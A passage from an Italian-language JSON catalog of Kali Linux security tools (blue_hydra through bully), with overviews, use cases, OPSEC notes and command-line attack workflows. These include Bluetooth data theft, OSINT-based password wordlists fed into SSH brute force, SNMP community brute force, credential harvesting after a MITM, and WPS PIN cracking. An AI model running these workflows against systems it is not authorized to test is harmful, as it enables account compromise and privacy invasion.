esterna\nsqlite3 -header -csv /var/lib/blue_hydra/blue_hydra.db \"SELECT * FROM blue_hydra_devices;\" > devices.csv\n\n# Timeline presenza dispositivo specifico\nSELECT timestamp, rssi FROM blue_hydra_device_observations WHERE device_id = (SELECT id FROM blue_hydra_devices WHERE address = 'AA:BB:CC:DD:EE:FF');\n\n# === DAEMON MODE ===\n# Avvio come servizio systemd\nsudo systemctl enable blue_hydra\nsudo systemctl start blue_hydra\n\n# Log real-time\njournalctl -fu blue_hydra</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Security Assessment</strong>, monitora quali dispositivi Bluetooth (telefoni dipendenti, visitatori, dispositivi sconosciuti) sono presenti in un'area protetta nel tempo.</p><p>In <strong>Wireless Pentesting</strong>, enumera target BLE (dispositivi IoT, smartwatch, beacon) per successivi attacchi con bettercap o gatttool.</p><p>Per <strong>TSCM</strong> (Technical Surveillance Countermeasures), rileva dispositivi sospetti che potrebbero essere utilizzati per sorveglianza (microfoni BLE, tracker).</p><p>In <strong>Employee Tracking</strong> (con autorizzazione), analizza pattern di presenza basati sui dispositivi personali.</p><p>Per <strong>Retail Analytics</strong>, traccia flusso clienti basato su dispositivi Bluetooth visibili (con considerazioni privacy).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware Compatibility:</strong> Richiede adapter Bluetooth 4.0+ per BLE. Non tutti i dongle supportano scanning simultaneo Classic+BLE. CSR chipset raccomandato.</p><p><strong>MAC Randomization:</strong> iOS e Android moderni randomizzano MAC BLE in background. Tracking affidabile solo quando dispositivo è attivamente in uso o connesso.</p><p><strong>Legal Considerations:</strong> Il tracking di dispositivi personali può violare normative privacy (GDPR). Usare solo in contesti autorizzati.</p><p><strong>Range:</strong> Bluetooth ha range limitato (~10m indoor). Posizionamento strategico dei sensori per copertura.</p><p><strong>Resource Usage:</strong> Scanning continuo consuma risorse. Database può crescere significativamente in aree ad alto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bluesnarfer",
    "name": "bluesnarfer",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bluesnarfer/",
    "desc": "Sfrutta vulnerabilità Bluetooth per estrarre contatti e SMS da telefoni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bluesnarfer</strong> sfrutta la vulnerabilità 'Bluesnarf' (CVE-2004-2091) scoperta nel 2003-2004 che affliggeva telefoni Nokia, Sony Ericsson, Samsung e Motorola. La falla nel profilo OBEX Push permetteva di accedere ai dati del dispositivo (rubrica, SMS, calendario, IMEI) senza autenticazione o notifica all'utente. Sebbene i dispositivi moderni siano immuni, il tool rimane rilevante per testare dispositivi legacy in ambienti industriali, sanitari, automotive, e per scopi educativi sulla sicurezza Bluetooth.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contact Extraction:</strong> Scarica rubrica completa (phonebook + SIM contacts) via OBEX senza autenticazione.</p><p><strong>SMS Access:</strong> Legge messaggi SMS dalla memoria del telefono e della SIM card (inbox, sent, drafts).</p><p><strong>Calendar/Notes:</strong> Accede a calendario, note, todo list e altri dati PIM esposti.</p><p><strong>IMEI Retrieval:</strong> Estrae l'identificativo univoco del dispositivo per tracking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DISCOVERY ===\nhciconfig hci0 up\nhcitool scan  # Lista dispositivi visibili\n\n# === ATTACCO ===\n# Estrazione rubrica (entries 1-100)\nbluesnarfer -r 1-100 -b AA:BB:CC:DD:EE:FF\n\n# Lettura SMS inbox\nbluesnarfer -s SM -b AA:BB:CC:DD:EE:FF\n\n# Get IMEI\nbluesnarfer -i -b AA:BB:CC:DD:EE:FF\n\n# === VERIFICA ===\nsdptool browse AA:BB:CC:DD:EE:FF | grep -i OBEX</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Principalmente <strong>storico/didattico</strong> per comprendere l'evoluzione delle vulnerabilità Bluetooth.</p><p>In <strong>Legacy Testing</strong>, ancora rilevante per dispositivi in ambienti industriali (SCADA), sanitari, automotive con apparecchiature datate.</p><p>Per <strong>Security Training</strong>, dimostra l'importanza degli aggiornamenti e della sicurezza Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia Limitata:</strong> Dispositivi post-2006 con firmware aggiornato sono immuni. Richiede Bluetooth attivo e discoverable.</p><p><strong>Range:</strong> Bluetooth Class 2 ha range ~10m. Necessaria prossimità fisica.</p><p><strong>Legalità:</strong> L'accesso non autorizzato a dispositivi altrui è reato penale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "bopscrk",
    "name": "bopscrk",
    "version": "2.4.7",
    "icon": "../app/icons/bopscrk-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bopscrk/",
    "desc": "Genera wordlist personalizzate basate su info del target (nome, date, hobby).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BOPSCRK</strong> (Before Outset PaSsworCRacKing) genera wordlist personalizzate basate su informazioni OSINT raccolte sul target. Le persone creano password 'facili da ricordare' usando pattern prevedibili: nome+anno, cognome+data nascita, nome_pet+123, ecc. Inserendo dati personali (nome, cognome, date importanti, familiari, pet, hobby, azienda), BOPSCRK genera migliaia di combinazioni che riflettono questi pattern reali, aumentando drasticamente le probabilità di successo rispetto a dizionari generici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Personal Info Processing:</strong> Accetta nomi, cognomi, date (nascita, anniversario), familiari, pet, hobby, parole chiave custom e le combina intelligentemente.</p><p><strong>Leet Speak:</strong> Applica sostituzioni classiche: a→@, e→3, i→1, o→0, s→$, t→7.</p><p><strong>Case Variations:</strong> Genera variazioni: tutto minuscolo, tutto maiuscolo, Capitalizzato, cAMELcASE.</p><p><strong>Year/Number Suffixes:</strong> Aggiunge anni (1990-2024), numeri comuni (123, 1234, 321), date in vari formati.</p><p><strong>Special Characters:</strong> Append di simboli comuni: !, @, #, $, *, ., _</p><p><strong>Combination Depth:</strong> Configura quanto combinare le parole tra loro (depth 1-4).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === MODALITÀ INTERATTIVA ===\nbopscrk -i\n# Risponde alle domande su nome, cognome, date, familiari, etc.\n\n# === PARAMETRI DIRETTI ===\n# Esempio per target 'Mario Rossi' nato il 15/03/1985\nbopscrk -n mario -s rossi -b 15/03/1985 -o wordlist.txt\n\n# Con familiari e pet\nbopscrk -n mario -s rossi -b 15/03/1985 \\\n  --wife laura --child marco --child giulia \\\n  --pet fido --pet micio -o wordlist.txt\n\n# Con hobby e parole chiave\nbopscrk -n mario -s rossi \\\n  --hobby calcio --hobby inter \\\n  --words 'password,admin,milan' -o wordlist.txt\n\n# === CONFIGURAZIONE AVANZATA ===\n# Depth maggiore = più combinazioni\nbopscrk -n mario -s rossi --depth 3 -o wordlist.txt\n\n# Includi anni specifici\nbopscrk -n mario -s rossi --years 1985,2020,2023 -o wordlist.txt\n\n# Solo leet speak\nbopscrk -n mario -s rossi --leet -o wordlist.txt\n\n# === POST-PROCESSING ===\n# Rimuovi duplicati e ordina\nsort -u wordlist.txt > wordlist_clean.txt\n\n# Filtra per lunghezza (min 8, max 16)\nawk 'length >= 8 && length <= 16' wordlist_clean.txt > wordlist_filtered.txt\n\n# === INTEGRAZIONE HASHCAT ===\n# Genera base con BOPSCRK, applica regole hashcat\nbopscrk -n mario -s rossi -o base.txt\nhashcat -a 0 -m 0 hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule\n\n# === WORKFLOW COMPLETO ===\n# 1. OSINT sul target (LinkedIn, Facebook, Instagram)\n# 2. Raccogli: nome, cognome, data nascita, familiari, pet, hobby, azienda\n# 3. Genera wordlist personalizzata\nbopscrk -i -o target_wordlist.txt\n# 4. Combina con dizionario base\ncat target_wordlist.txt /usr/share/wordlists/rockyou.txt | sort -u > combined.txt\n# 5. Attack\nhydra -l mario.rossi -P combined.txt target.com ssh</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Targeted Password Attacks</strong>, dopo OSINT approfondito su un target specifico, la wordlist personalizzata ha success rate 10x superiore a dizionari generici.</p><p>In <strong>Spear Phishing Campaigns</strong>, le password 'indovinate' dimostrano compromissione credibile.</p><p>Per <strong>Security Awareness Training</strong>, dimostra concretamente quanto le password basate su info personali siano deboli.</p><p>In <strong>Password Policy Assessment</strong>, verifica se la policy impedisce password prevedibili.</p><p>Per <strong>CTF</strong>, challenge che richiedono 'conoscere' il target spesso si risolvono con wordlist personalizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficienza:</strong> Wordlist personalizzate sono piccole (10K-100K) ma efficaci. Meglio di rockyou per target specifici.</p><p><strong>Combinazione:</strong> Massima efficacia combinando BOPSCRK output con regole hashcat (best64, dive, OneRuleToRuleThemAll).</p><p><strong>OSINT Quality:</strong> L'efficacia dipende dalla qualità delle info raccolte. Più dati = più combinazioni = più probabilità.</p><p><strong>Account Lockout:</strong> Wordlist grandi possono triggerare lockout. Verificare policy prima di attaccare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "braa",
    "name": "braa",
    "version": "0.82",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/braa/",
    "desc": "Scanner SNMP massivo per interrogare rapidamente migliaia di host.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Braa</strong> è uno scanner SNMP ad altissime prestazioni progettato per interrogare decine di migliaia di host in parallelo. A differenza di snmpwalk/snmpget che operano sequenzialmente (un host alla volta), Braa implementa un proprio stack SNMP asincrono che può gestire migliaia di query simultanee, completando scansioni di intere /16 subnet in pochi minuti. È ottimizzato per discovery massiva, estrazione rapida di OID specifici, e community string bruteforcing su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Massive Parallelism:</strong> Architettura asincrona che gestisce 50.000+ query simultanee usando socket raw UDP.</p><p><strong>Multi-OID Query:</strong> Interroga multipli OID in una singola scansione per estrarre informazioni composite.</p><p><strong>Range Support:</strong> Supporta CIDR notation, range IP (1-254), e liste di host.</p><p><strong>Community Bruteforce:</strong> Testa multiple community string contro molti host simultaneamente.</p><p><strong>Performance:</strong> Scansione di /24 in ~1 secondo, /16 in ~5 minuti (dipende da rete/timeout).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SINTASSI BASE ===\n# braa [opzioni] community@host:OID\n\n# === OID COMUNI ===\n# .1.3.6.1.2.1.1.1.0  - sysDescr (descrizione sistema)\n# .1.3.6.1.2.1.1.3.0  - sysUpTime\n# .1.3.6.1.2.1.1.4.0  - sysContact\n# .1.3.6.1.2.1.1.5.0  - sysName (hostname)\n# .1.3.6.1.2.1.1.6.0  - sysLocation\n# .1.3.6.1.2.1.2.1.0  - ifNumber (num interfacce)\n\n# === DISCOVERY BASE ===\n# Query sysDescr su subnet\nbraa public@192.168.1.1-254:.1.3.6.1.2.1.1.1.0\n\n# Query hostname\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.5.0\n\n# Query multipli OID\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0,.1.3.6.1.2.1.1.5.0,.1.3.6.1.2.1.1.6.0\n\n# === OPZIONI PERFORMANCE ===\n# Timeout personalizzato (default 2s)\nbraa -t 1 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0\n\n# Numero query parallele (default 256)\nbraa -p 512 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0\n\n# === COMMUNITY BRUTEFORCE ===\n# Testa più community string\nfor comm in public private admin cisco; do\n  braa $comm@192.168.1.0/24:.1.3.6.1.2.1.1.1.0 2>/dev/null | grep -v \"Timeout\"\ndone\n\n# Con lista community\nwhile read comm; do\n  braa \"$comm@192.168.1.0/24:.1.3.6.1.2.1.1.1.0\"\ndone < community_list.txt\n\n# === LARGE SCALE SCANNING ===\n# Scansione /16 (65K host)\nbraa -t 1 -p 1000 public@10.0.0.0/16:.1.3.6.1.2.1.1.1.0 > snmp_results.txt\n\n# Parse risultati\ngrep -v \"Timeout\" snmp_results.txt | cut -d: -f1 | sort -u > snmp_hosts.txt\n\n# === WORKFLOW PENTEST ===\n# 1. Discovery SNMP\nbraa public@192.168.1.0/24:.1.3.6.1.2.1.1.1.0 > snmp_discovery.txt\n\n# 2. Identifica dispositivi con SNMP attivo\ngrep -v \"Timeout\" snmp_discovery.txt\n\n# 3. Bruteforce community su host trovati\nfor host in $(cut -d: -f1 snmp_discovery.txt | grep -v Timeout); do\n  for comm in public private admin cisco community; do\n    result=$(braa -t 1 \"$comm@$host:.1.3.6.1.2.1.1.1.0\" 2>/dev/null | grep -v Timeout)\n    [ -n \"$result\" ] && echo \"$host: $comm works\"\n  done\ndone\n\n# 4. Dump completo su dispositivi trovati\nsnmpwalk -v2c -c found_community target_ip</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Discovery</strong>, identifica rapidamente tutti i dispositivi SNMP su reti enterprise anche molto grandi (/16, /8).</p><p>Per <strong>Asset Inventory</strong>, estrae informazioni di sistema (descrizione, hostname, location) da router, switch, stampanti, UPS, IoT.</p><p>Nel <strong>Vulnerability Assessment</strong>, trova dispositivi con community string di default (public, private, admin) - ancora sorprendentemente comuni.</p><p>Per <strong>Penetration Testing</strong>, SNMP con community RW permette modifica configurazioni, community RO espone informazioni sensibili (routing tables, ARP cache).</p><p>In <strong>Compliance Audit</strong>, verifica che SNMP sia disabilitato o protetto con community complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Volume elevato di traffico UDP/161 è facilmente rilevabile da IDS/SIEM. Scansioni massive triggerano alert.</p><p><strong>Rate Limiting:</strong> Alcuni dispositivi rate-limitano SNMP. Troppo aggressivo = timeout falsi positivi.</p><p><strong>Community Exposure:</strong> SNMP v1/v2c trasmette community in chiaro. Sniffable su rete non switched.</p><p><strong>SNMPv3:</strong> Braa supporta principalmente v1/v2c. Per v3 con auth/privacy, usare snmpwalk.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "bruteshark",
    "name": "bruteshark",
    "version": "1.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bruteshark/",
    "desc": "Analizza PCAP per estrarre credenziali, hash, sessioni e ricostruire flussi TCP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BruteShark</strong> è uno strumento di Network Forensic Analysis Tool (NFAT) sviluppato in C#/.NET che analizza file PCAP per estrarre automaticamente informazioni di sicurezza. Identifica credenziali in chiaro da molteplici protocolli, estrae hash per cracking offline (Kerberos, NTLM, NetNTLMv2), ricostruisce sessioni TCP complete, carves file trasferiti, e genera mappe visuali delle comunicazioni. Disponibile come applicazione desktop GUI e CLI per automazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Extraction:</strong> Estrae credenziali da HTTP Basic/Digest/NTLM, FTP, SMTP, POP3, IMAP, Telnet, LDAP, Kerberos in formato ready-to-crack.</p><p><strong>Hash Extraction:</strong> Estrae hash Kerberos AS-REP/TGS, NTLM, NetNTLMv1/v2 in formato hashcat/john direttamente crackabili.</p><p><strong>Session Reconstruction:</strong> Ricostruisce sessioni TCP complete per analisi del contenuto applicativo.</p><p><strong>File Carving:</strong> Estrae file trasferiti via HTTP, FTP, SMB (immagini, documenti, eseguibili) mantenendo struttura originale.</p><p><strong>Network Diagram:</strong> Genera automaticamente grafo delle comunicazioni tra host con statistiche traffico.</p><p><strong>VoIP Analysis:</strong> Estrae audio da chiamate SIP/RTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GUI ===\nBruteSharkDesktop\n# File > Add File(s) > seleziona PCAP\n# Analyze per avviare estrazione\n# Tabs: Credentials, Hashes, Files, Sessions, Network Map\n\n# === CLI ===\n# Analisi base\nBruteSharkCli -d capture.pcap -o /output/folder\n\n# Moduli specifici\nBruteSharkCli -d capture.pcap -m Credentials,Hashes -o /output\n\n# === OUTPUT FILES ===\n# /output/Credentials.txt - username:password\n# /output/Hashes.txt - formato hashcat ready\n# /output/Files/ - file estratti\n# /output/NetworkMap.png - diagramma rete\n\n# === WORKFLOW POST-MITM ===\n# 1. Cattura traffico durante MITM\nsudo bettercap -iface eth0 -caplet sniff.cap\n\n# 2. Estrai credenziali\nBruteSharkCli -d capture.pcap -m Credentials -o ./extracted\n\n# 3. Cracka hash estratti\nhashcat -a 0 extracted/Hashes.txt /usr/share/wordlists/rockyou.txt\n\n# === INTEGRAZIONE WIRESHARK ===\n# Esporta da Wireshark: File > Export Objects > HTTP\n# Analizza con BruteShark per automazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Forensics</strong>, analizza traffico catturato durante incident response per identificare credenziali esfiltrate e comunicazioni sospette.</p><p>Per <strong>Pentest Post-MITM</strong>, estrae automaticamente tutte le credenziali catturate durante attacchi ARP/DNS spoofing.</p><p>In <strong>CTF</strong>, le challenge PCAP spesso contengono credenziali, flag in file trasferiti, o hash da craccare.</p><p>Per <strong>Red Team</strong>, analizza rapidamente grandi catture per trovare quick wins (credenziali plaintext).</p><p>In <strong>Security Audit</strong>, identifica protocolli che trasmettono credenziali in chiaro sulla rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico Cifrato:</strong> Non decifra HTTPS, SSH, TLS. Per questi, serve key logging o SSLstrip durante cattura.</p><p><strong>Performance:</strong> File PCAP grandi (GB+) richiedono RAM significativa e tempo di processing.</p><p><strong>False Positives:</strong> Alcuni pattern potrebbero essere identificati erroneamente come credenziali. Verificare manualmente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "brutespray",
    "name": "brutespray",
    "version": "2.2.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/brutespray/",
    "desc": "Automatizza brute force su servizi trovati da Nmap/Nessus con Medusa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BruteSpray</strong> automatizza il processo di credential testing sui servizi scoperti durante la scansione di rete. Prende in input risultati Nmap (XML, gNMAP) o Nessus/Nexpose e lancia automaticamente attacchi contro tutti i servizi supportati usando Medusa come backend. Supporta 20+ protocolli (SSH, FTP, Telnet, MySQL, MSSQL, PostgreSQL, VNC, RDP, SMB, SNMP, ecc.) e gestisce parallelismo, logging, e output strutturato. È il bridge ideale tra discovery e exploitation nel workflow di pentest.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Format Input:</strong> Legge Nmap XML/gNMAP, Nessus .nessus, file JSON custom. Auto-detecta servizi da output scan.</p><p><strong>20+ Protocols:</strong> SSH, FTP, Telnet, HTTP(S), MySQL, MSSQL, PostgreSQL, Oracle, VNC, RDP, SMB, SNMP, LDAP, POP3, IMAP, SMTP e altri.</p><p><strong>Parallel Attacks:</strong> Configura threads per host e per servizio per massima efficienza senza sovraccaricare i target.</p><p><strong>Credential Sources:</strong> Username/password singoli, file wordlist, combo file (user:pass), o default credentials builtin.</p><p><strong>Output Management:</strong> Log dettagliati, output JSON per automazione, report credenziali trovate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === INPUT DA NMAP ===\n# Prima esegui scan Nmap con version detection\nnmap -sV -oA scan 192.168.1.0/24\n\n# BruteSpray su output gNMAP\nbrutespray -f scan.gnmap -u users.txt -p passwords.txt\n\n# BruteSpray su output XML\nbrutespray -f scan.xml -U admin -P /usr/share/wordlists/rockyou.txt\n\n# === CONFIGURAZIONE ===\n# Solo servizi specifici\nbrutespray -f scan.xml -s ssh,ftp,mysql -u users.txt -p pass.txt\n\n# Threads per host e servizio\nbrutespray -f scan.xml -u users.txt -p pass.txt -t 5 -T 2\n\n# Con credenziali default builtin\nbrutespray -f scan.xml --default\n\n# === WORDLIST ===\n# Username comuni\necho -e \"admin\\nroot\\nuser\\ntest\\nguest\" > users.txt\n\n# Password comuni\necho -e \"admin\\npassword\\n123456\\nroot\\ntest\" > pass.txt\n\n# === WORKFLOW COMPLETO ===\n# 1. Scan veloce\nnmap -sV -T4 --top-ports 1000 -oA initial 10.0.0.0/24\n\n# 2. BruteSpray con defaults + wordlist piccola\nbrutespray -f initial.gnmap --default -u users.txt -p pass.txt -o results.txt\n\n# 3. Review credenziali trovate\ncat results.txt | grep \"SUCCESS\"\n\n# === OUTPUT ===\n# Salva risultati in file\nbrutespray -f scan.xml -u users.txt -p pass.txt -o found_creds.txt\n\n# Output JSON per automazione\nbrutespray -f scan.xml -u users.txt -p pass.txt --json -o results.json\n\n# === CONTINUOUS MODE ===\n# Brute force continuo su servizi trovati\nbrutespray -f scan.xml -u users.txt -p pass.txt -c  # continue on success</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Workflow <strong>OSCP/Internal Pentest</strong>: dopo Nmap, BruteSpray testa rapidamente credenziali di default e comuni su tutti i servizi scoperti.</p><p>Per <strong>Automation Pipeline</strong>, integrabile in script di scansione automatizzata (Nmap -> BruteSpray -> Report).</p><p>In <strong>Password Audit</strong>, verifica che non esistano credenziali deboli o default su servizi esposti.</p><p>Per <strong>Quick Wins</strong>, le credenziali default sono sorprendentemente comuni in ambienti enterprise (admin:admin, root:toor).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Account Lockout:</strong> Brute force può causare lockout. Verificare policy prima. Usare wordlist piccole e specifiche.</p><p><strong>Detection:</strong> Molti login falliti sono facilmente rilevabili da SIEM/IDS. Genera log evidenti sui target.</p><p><strong>Rate Limiting:</strong> Alcuni servizi hanno rate limiting. Ridurre threads se timeout frequenti.</p><p><strong>Legal:</strong> Solo su sistemi autorizzati. Brute force non autorizzato è reato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "bulk-extractor",
    "name": "bulk-extractor",
    "version": "2.1.1",
    "icon": "../app/icons/bulk-extractor-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bulk-extractor/",
    "desc": "Estrae email, URL, carte di credito, hash da immagini disco senza mount.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bulk_extractor è uno strumento di digital forensics ad altissime prestazioni sviluppato dal Naval Postgraduate School. Scansiona immagini disco, file o directory alla ricerca di informazioni strutturate (PII) senza richiedere mount del filesystem - opera direttamente sui byte raw, estraendo dati anche da spazio non allocato, slack space, file compressi e nested archives. Parallelizzato per sfruttare tutti i core CPU, può analizzare terabyte in ore. Output: file categorizzati + istogrammi per analisi frequenze.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Email Scanner:</strong> Estrae indirizzi email, domini associati, e costruisce histogrammi dei più frequenti.</p><p><strong>URL/Domain:</strong> Identifica URL visitati, domini, con decodifica di URL encoding.</p><p><strong>Credit Card:</strong> Riconosce numeri di carte di credito con validazione Luhn e identificazione issuer.</p><p><strong>Phone/SSN:</strong> Estrae numeri di telefono e Social Security Numbers in vari formati.</p><p><strong>EXIF:</strong> Estrae metadati EXIF da immagini inclusi GPS coordinates.</p><p><strong>Hash Recognition:</strong> Identifica hash MD5, SHA1, SHA256 nel testo.</p><p><strong>Network Artifacts:</strong> IP addresses, MAC addresses, search terms.</p><p><strong>Compression-Aware:</strong> Decomprime automaticamente ZIP, GZIP, RAR, 7z, PDF streams.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ANALISI BASE ===\n# Estrazione completa da immagine disco\nbulk_extractor -o output_dir disk_image.dd\n\n# Con tutti i threads disponibili (default)\nbulk_extractor -o output disk.img\n\n# === SCANNER SPECIFICI ===\n# Solo email e URL\nbulk_extractor -E email -E url -o output disk.img\n\n# Lista scanner disponibili\nbulk_extractor -H\n\n# Disabilita scanner specifici\nbulk_extractor -x exif -x gps -o output disk.img\n\n# === INPUT SOURCES ===\n# Da directory (ricorsivo)\nbulk_extractor -o output -R /path/to/directory\n\n# Da file singolo\nbulk_extractor -o output suspicious_file.exe\n\n# Da memory dump\nbulk_extractor -o output memory.dmp\n\n# === OUTPUT FILES ===\n# output_dir/\n#   email.txt - indirizzi email estratti\n#   url.txt - URL trovati\n#   ccn.txt - credit card numbers\n#   telephone.txt - numeri telefono\n#   domain.txt - domini\n#   exif.txt - metadata EXIF\n#   *_histogram.txt - frequenze per ogni categoria\n\n# === POST-PROCESSING ===\n# Top 10 email più frequenti\nhead -20 output_dir/email_histogram.txt\n\n# Cerca email specifico dominio\ngrep \"@target.com\" output_dir/email.txt\n\n# Estrai GPS coordinates\ncat output_dir/exif.txt | grep -i \"gps\"\n\n# === WORKFLOW FORENSICS ===\n# 1. Acquisizione immagine\ndc3dd if=/dev/sda of=disk.img hash=sha256 log=acquisition.log\n\n# 2. Bulk extraction\nbulk_extractor -o bulk_output disk.img\n\n# 3. Analisi istogrammi\nfor f in bulk_output/*_histogram.txt; do\n  echo \"=== $f ===\"\n  head -10 \"$f\"\ndone\n\n# 4. Report summary\nwc -l bulk_output/*.txt > summary.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, primo tool lanciato su immagine per panoramica rapida dei PII presenti e delle comunicazioni.</p><p>Per <strong>Data Breach Investigation</strong>, identifica rapidamente quali dati sensibili (email, CCN, PII) potrebbero essere stati compromessi.</p><p>In <strong>eDiscovery</strong>, estrazione automatizzata di comunicazioni e documenti rilevanti per contenziosi.</p><p>Per <strong>Malware Analysis</strong>, estrae indicatori (URL, email, domini) da sample malware.</p><p>In <strong>Memory Forensics</strong>, complementa Volatility per estrazione stringhe strutturate da RAM dump.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Performance:</strong> Multi-threaded, analizza ~1GB/min su hardware moderno. Terabyte in ore, non giorni.</p><p><strong>Space:</strong> Output può essere significativo (GB per disk grandi). Prevedere spazio adeguato.</p><p><strong>False Positives:</strong> Pattern matching può generare falsi positivi (es. numeri che sembrano CCN). Verificare manualmente i risultati critici.</p><p><strong>Privacy:</strong> Output contiene PII sensibili. Proteggere adeguatamente e cancellare dopo analisi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "bully",
    "name": "bully",
    "version": "1.4.00",
    "icon": "../app/icons/bully-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bully/",
    "desc": "Attacca WPS con brute force del PIN per recuperare passphrase WPA/WPA2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Bully</strong> è un'implementazione del WPS brute force attack, alternativa più efficiente a Reaver. La vulnerabilità WPS (CVE-2011-5053) deriva dal design del protocollo: il PIN a 8 cifre viene verificato in due metà separate (4+3 cifre + 1 checksum), riducendo lo spazio di ricerca da 10^8 a ~11.000 tentativi. Bully sfrutta questo difetto per recuperare la password WPA/WPA2 senza catturare handshake. Include supporto per Pixie-Dust attack che recupera il PIN offline in secondi su router vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS PIN Bruteforce:</strong> Attacco online che testa sequenzialmente le combinazioni PIN sfruttando la vulnerabilità del checksum.</p><p><strong>Pixie-Dust Attack:</strong> Attacco offline che sfrutta PRNG debole in alcuni chipset (Ralink, Realtek, Broadcom) per recuperare PIN in secondi.</p><p><strong>Session Management:</strong> Salva progresso in file .wpc permettendo di riprendere attacchi interrotti.</p><p><strong>Rate Limiting Handling:</strong> Rileva lockout AP e attende automaticamente timeout prima di riprendere.</p><p><strong>Multiple Modes:</strong> Supporta WPS PIN, Push-Button (PBC), e registrar mode.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP ===\n# Monitor mode\nairmon-ng start wlan0\n\n# Identifica AP con WPS abilitato\nwash -i wlan0mon\n# Output mostra: BSSID, Channel, WPS Version, WPS Locked status\n\n# === PIXIE-DUST (VELOCE) ===\n# Prova prima Pixie-Dust - funziona in secondi se vulnerabile\nbully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon\n\n# Con verbose per debug\nbully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon\n\n# === BRUTE FORCE ONLINE ===\n# Se Pixie-Dust fallisce, brute force tradizionale\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# Con PIN parziale noto (accelera)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -p 1234 wlan0mon\n\n# === OPZIONI AVANZATE ===\n# Delay tra tentativi (evita lockout)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -l 3 wlan0mon\n\n# Timeout per risposta (default 5s)\nbully -b AA:BB:CC:DD:EE:FF -c 6 -t 10 wlan0mon\n\n# 